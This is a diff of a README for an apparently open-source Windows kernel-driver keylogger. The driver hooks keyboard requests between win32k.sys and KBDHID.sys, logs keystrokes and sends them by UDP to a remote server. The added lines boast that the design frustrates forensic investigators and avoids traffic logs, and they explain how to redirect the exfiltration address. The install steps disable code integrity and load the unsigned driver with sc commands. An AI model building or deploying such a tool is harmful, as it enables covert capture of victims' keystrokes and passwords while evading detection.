@@ -20,18 +20,18 @@ while to implement this 'kernel man in the middle', we need to mimic the IRP fun
 Our hook (by the diagram above) will come in beetwin win32k.sys & KBDHID.sys, each request is cached by our hook, proccessed by Our driver and passed up to the next irql.<br>
 The Second part of Our driver Operation is to log the keystrokes & send them back to our monitoring server.<br>
 i have implemented a UDP-DataGram protocol, as we do not recieve or handle any data coming back from the server, and this also make's the monitoring process a lot simpler by the server side.<br>
-Another Advantage to a udp implementation is that the port can be closed and opened contantly to make the #dfir work a lot harder.<br>
+Another Advantage to a udp implementation is that the port can be closed and opened constantly to make the #dfir work a lot harder, and udp is not a stream based connection so you can avoid traffic logs etc'.<br>
 to implement that i made use of the <html><a href="https://msdn.microsoft.com/library/windows/hardware/ff571083">Wsk</a></html>, (windows socket kernel), as to avoid any user-mode application.<br>
 # Usage
-currently only the local keylogger is Generic nd can be used W/O building the driver (as it simply logs the keystroke's to C:\\Windows\\logs), but the remote udp based (that do not need to write any data to disk to run), needs to be build to your server address, as time will pass i will add a universal support, so you wouldn't have to build your own.
-# Installtion:
-!The driver is not signed, so you will have to disable code integrity (or get me a sponser to sign the driver), after that:<br>
+currently only the local keylogger is Generic and can be used W/O building the driver (as it simply logs the keystroke's to C:\\Windows\\logs), but the remote udp based (that do not need to write any data to disk to run), needs to be build to your server address (or any other solution. this can be done with very minor code modifications. e.g let the driver read from the registry your ip and load it in /src/driver.c line 420).
+# Install:
+!The driver is not signed, so you will have to disable code integrity, after that:<br>
 Open an elevated command prompt:<br>
 sc create kMon type=kernel binpath="\path\to\your\driver.sys"<br>
 sc start kMon<br>
 # Uninstall:
 sc stop Kmon
 # if you encounter any problems simply restart your computer.
-# For any bugs comment an issue in this github repo.
+For any bugs comment an issue in this github repo.
 enjoy!
 
